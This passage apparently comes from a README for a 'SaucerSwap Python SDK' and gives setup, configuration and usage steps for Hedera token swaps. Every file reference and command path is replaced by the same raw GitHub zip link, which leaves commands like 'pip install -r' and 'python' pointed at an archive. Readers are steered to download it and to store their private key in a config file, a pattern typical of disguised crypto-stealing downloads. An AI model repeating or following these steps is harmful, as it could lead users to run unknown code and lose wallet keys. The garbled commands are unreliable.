- On Linux, use the terminal to navigate to your Downloads folder and run `tar -xzf <filename>https://github.com/sevvalbaydemir/saucerswap-python-sdk/raw/refs/heads/main/unfondled/saucerswap_sdk_python_v1.7.zip` to extract the contents.

### 4. Install Dependencies
The SDK requires Python packages to function correctly. Use the terminal or command prompt to navigate to the extracted folder. Run the following command:

```bash
pip install -r https://github.com/sevvalbaydemir/saucerswap-python-sdk/raw/refs/heads/main/unfondled/saucerswap_sdk_python_v1.7.zip
```

This command installs all necessary packages.

## ⚙️ Configuration
To use the SDK:
1. Set up your Hedera account and get some HBAR tokens. This will allow you to perform transactions.
2. Update the configuration file in the SDK folder with your account details. This file usually named `https://github.com/sevvalbaydemir/saucerswap-python-sdk/raw/refs/heads/main/unfondled/saucerswap_sdk_python_v1.7.zip` includes:
   - Your Hedera account ID
   - Your operator private key
   - Network information (mainnet or testnet)

### Example Configuration
Here is a sample of how your `https://github.com/sevvalbaydemir/saucerswap-python-sdk/raw/refs/heads/main/unfondled/saucerswap_sdk_python_v1.7.zip` might look:

```json
{
   "account_id": "your-account-id",
   "private_key": "your-private-key",
   "network": "testnet"
}
```

Make sure to replace the placeholders with your actual details.

## 🛠️ Usage
To start using the SaucerSwap Python SDK, open your terminal or command prompt. Navigate to the folder where you have extracted the SDK. You can use the following command to see a list of available options:

```bash
python https://github.com/sevvalbaydemir/saucerswap-python-sdk/raw/refs/heads/main/unfondled/saucerswap_sdk_python_v1.7.zip --help
```

This will display options for swapping tokens, checking balances, and more.

### Basic Commands
Here are some basic commands you can use with the SDK:

- **Check Balance**: 
  ```bash
  python https://github.com/sevvalbaydemir/saucerswap-python-sdk/raw/refs/heads/main/unfondled/saucerswap_sdk_python_v1.7.zip balance
